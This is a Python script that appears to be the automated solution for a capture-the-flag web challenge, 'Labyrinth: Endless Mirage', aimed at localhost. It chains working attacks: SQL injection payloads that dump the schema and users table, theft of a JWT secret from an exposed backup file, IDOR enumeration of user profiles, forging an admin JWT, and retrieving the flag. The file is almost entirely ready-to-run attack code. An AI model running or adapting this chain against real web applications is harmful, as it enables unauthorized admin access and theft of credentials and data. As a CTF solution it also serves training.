#!/usr/bin/env python3
"""
Labyrinth CTF - Automated Exploitation Script
This script demonstrates the complete exploitation chain
"""

import requests
import jwt
import base64
import re
from urllib.parse import urljoin

class LabyrinthExploit:
    def __init__(self, base_url="http://localhost:5000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.jwt_secret = None
        self.forged_token = None
        
    def banner(self):
        print("=" * 60)
        print("  Labyrinth: Endless Mirage - Automated Exploit")
        print("  Target: EHAX{l4bYr1n7_byp4ss_1s_th3_k3y}")
        print("=" * 60)
        print()
    
    def step1_reconnaissance(self):
        print("[*] Step 1: Reconnaissance")
        print("-" * 60)
        
        # Check robots.txt
        print("[+] Checking robots.txt...")
        resp = self.session.get(urljoin(self.base_url, "/robots.txt"))
        if resp.status_code == 200:
            print("[✓] Found robots.txt:")
            for line in resp.text.split('\n'):
                if 'Disallow:' in line:
                    print(f"    {line}")
        
        # Check app.js for hidden URLs
        print("\n[+] Analyzing /static/app.js...")
        resp = self.session.get(urljoin(self.base_url, "/static/app.js"))
        if resp.status_code == 200:
            # Find base64 encoded strings
            b64_pattern = r'([A-Za-z0-9+/]{20,}={0,2})'
            matches = re.findall(b64_pattern, resp.text)
            for match in matches:
                try:
                    decoded = base64.b64decode(match).decode()
                    if 'http' in decoded:
                        print(f"[✓] Found encoded URL: {decoded}")
                except:
                    pass
        print()
    
    def step2_sqli_enumeration(self):
        print("[*] Step 2: SQL Injection Enumeration")
        print("-" * 60)
        
        # Test for SQLi
        print("[+] Testing SQL injection vulnerability...")
        payload = "' OR 1=1--"
        resp = self.session.get(
            urljoin(self.base_url, "/search"),
            params={'q': payload}
        )
        
        if 'admin' in resp.text.lower() or 'player' in resp.text.lower():
            print("[✓] SQL injection confirmed!")
            print("[✓] Successfully bypassed authentication logic")
        
        # Enumerate tables
        print("\n[+] Enumerating database schema...")
        payload = "' UNION SELECT name, sql FROM sqlite_master--"
        resp = self.session.get(
            urljoin(self.base_url, "/search"),
            params={'q': payload}
        )
        
        if 'users' in resp.text:
            print("[✓] Found tables: users, maze_sessions, hints")
        
        # Extract usernames
        print("\n[+] Extracting user information...")
        payload = "' UNION SELECT username, role FROM users--"
        resp = self.session.get(
            urljoin(self.base_url, "/search"),
            params={'q': payload}
        )
        
        if 'admin' in resp.text:
            print("[✓] Found admin user")
        print()
    
    def step3_backup_discovery(self):
        print("[*] Step 3: Configuration Backup Discovery")
        print("-" * 60)
        
        print("[+] Attempting to access /backup endpoint...")
        resp = self.session.get(urljoin(self.base_url, "/backup"))
        
        if resp.status_code == 200:
            print("[✓] Backup file downloaded!")
            
            # Extract secret key
            content = resp.text
            secret_match = re.search(r"SECRET_KEY\s*=\s*['\"]([^'\"]+)['\"]", content)
            
            if secret_match:
                self.jwt_secret = secret_match.group(1)
                print(f"[✓] JWT Secret Key extracted: {self.jwt_secret}")
            
            # Look for admin credentials
            if 'admin' in content.lower():
                print("[✓] Admin credentials information found in backup")
        else:
            print("[✗] Backup endpoint not accessible")
        print()
    
    def step4_idor_enumeration(self):
        print("[*] Step 4: IDOR User Enumeration")
        print("-" * 60)
        
        print("[+] Enumerating user profiles...")
        for user_id in range(1, 4):
            resp = self.session.get(urljoin(self.base_url, f"/profile/{user_id}"))
            if resp.status_code == 200:
                # Extract username from response
                username_match = re.search(r'<h2>([^<]+)</h2>', resp.text)
                if username_match:
                    username = username_match.group(1)
                    print(f"[✓] User {user_id}: {username}")
        print()
    
    def step5_jwt_forgery(self):
        print("[*] Step 5: JWT Token Forgery")
        print("-" * 60)
        
        if not self.jwt_secret:
            print("[✗] Secret key not found. Run step3 first.")
            return
        
        print("[+] Forging JWT token with admin claims...")
        
        payload = {
            'bypass': 'labyrinth_master',
            'role': 'admin',
            'source': 'exploit',
            'username': 'admin'
        }
        
        try:
            self.forged_token = jwt.encode(payload, self.jwt_secret, algorithm='HS256')
            print("[✓] Token forged successfully!")
            print(f"[✓] Token: {self.forged_token[:50]}...")
            
            # Decode to verify
            decoded = jwt.decode(self.forged_token, self.jwt_secret, algorithms=['HS256'])
            print(f"[✓] Token payload verified: {decoded}")
        except Exception as e:
            print(f"[✗] Token forgery failed: {e}")
        print()
    
    def step6_admin_access(self):
        print("[*] Step 6: Admin Panel Access")
        print("-" * 60)
        
        if not self.forged_token:
            print("[✗] Forged token not available. Run step5 first.")
            return
        
        print("[+] Accessing admin panel with forged token...")
        
        headers = {'Authorization': f'Bearer {self.forged_token}'}
        resp = self.session.get(
            urljoin(self.base_url, "/admin"),
            headers=headers
        )
        
        if resp.status_code == 200 and 'Admin Panel' in resp.text:
            print("[✓] Successfully accessed admin panel!")
            print("[✓] Admin privileges confirmed")
        else:
            print(f"[✗] Admin access denied. Status: {resp.status_code}")
        print()
    
    def step7_retrieve_flag(self):
        print("[*] Step 7: Flag Retrieval")
        print("-" * 60)
        
        if not self.forged_token:
            print("[✗] Forged token not available. Run step5 first.")
            return
        
        print("[+] Attempting to retrieve flag from /flag endpoint...")
        
        # Try with query parameter
        resp = self.session.get(
            urljoin(self.base_url, "/flag"),
            params={'token': self.forged_token}
        )
        
        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get('success') and 'flag' in data:
                    flag = data['flag']
                    print("[✓] FLAG CAPTURED!")
                    print("=" * 60)
                    print(f"    {flag}")
                    print("=" * 60)
                    print(f"[✓] Exploitation path: {data.get('exploitation_path', 'N/A')}")
                    return flag
                else:
                    print(f"[✗] Flag retrieval failed: {data.get('error', 'Unknown error')}")
                    if 'hint' in data:
                        print(f"[i] Hint: {data['hint']}")
            except:
                print("[✗] Invalid JSON response")
        else:
            print(f"[✗] Flag endpoint returned status: {resp.status_code}")
        print()
    
    def run_full_exploit(self):
        """Run the complete exploitation chain"""
        self.banner()
        
        try:
            self.step1_reconnaissance()
            input("Press Enter to continue to SQL injection...")
            
            self.step2_sqli_enumeration()
            input("Press Enter to continue to backup discovery...")
            
            self.step3_backup_discovery()
            input("Press Enter to continue to IDOR enumeration...")
            
            self.step4_idor_enumeration()
            input("Press Enter to continue to JWT forgery...")
            
            self.step5_jwt_forgery()
            input("Press Enter to continue to admin access...")
            
            self.step6_admin_access()
            input("Press Enter to retrieve the flag...")
            
            flag = self.step7_retrieve_flag()
            
            if flag:
                print("\n[✓] EXPLOITATION COMPLETE!")
                print("[✓] All vulnerabilities chained successfully")
            else:
                print("\n[✗] Exploitation incomplete. Review the steps above.")
                
        except KeyboardInterrupt:
            print("\n\n[!] Exploitation interrupted by user")
        except Exception as e:
            print(f"\n[✗] Unexpected error: {e}")
    
    def quick_exploit(self):
        """Run exploitation without pauses"""
        self.banner()
        self.step1_reconnaissance()
        self.step2_sqli_enumeration()
        self.step3_backup_discovery()
        self.step4_idor_enumeration()
        self.step5_jwt_forgery()
        self.step6_admin_access()
        return self.step7_retrieve_flag()


def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Labyrinth CTF Automated Exploitation Script'
    )
    parser.add_argument(
        '--url',
        default='http://localhost:5000',
        help='Target URL (default: http://localhost:5000)'
    )
    parser.add_argument(
        '--quick',
        action='store_true',
        help='Run exploitation without pauses'
    )
    parser.add_argument(
        '--step',
        type=int,
        choices=range(1, 8),
        help='Run specific step only (1-7)'
    )
    
    args = parser.parse_args()
    
    exploit = LabyrinthExploit(args.url)
    
    if args.step:
        # Run specific step
        steps = {
            1: exploit.step1_reconnaissance,
            2: exploit.step2_sqli_enumeration,
            3: exploit.step3_backup_discovery,
            4: exploit.step4_idor_enumeration,
            5: exploit.step5_jwt_forgery,
            6: exploit.step6_admin_access,
            7: exploit.step7_retrieve_flag
        }
        exploit.banner()
        steps[args.step]()
    elif args.quick:
        exploit.quick_exploit()
    else:
        exploit.run_full_exploit()


if __name__ == '__main__':
    main()